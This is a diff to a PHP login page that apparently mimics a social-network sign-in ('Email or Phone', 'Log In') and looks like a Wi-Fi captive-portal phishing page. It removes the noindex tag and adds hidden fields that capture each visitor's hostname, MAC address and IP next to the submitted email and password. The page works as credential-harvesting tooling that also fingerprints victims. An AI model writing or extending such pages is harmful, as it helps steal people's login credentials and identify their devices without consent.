@@ -15,7 +15,6 @@ require_once('helper.php');
     <meta http-equiv="pragma" content="no-cache" />
     <meta name="viewport" content="width=device-width,
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
     <meta name="theme-color" content="#5170ad" />
 
     <script src="jquery-2.2.1.min.js"></script>
@@ -179,6 +178,9 @@ require_once('helper.php');
 
             <center><label><input type="text" name="email" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
             <label><input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
+            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="<?=$destination?>">
             <input type="submit" value="Log In">
 
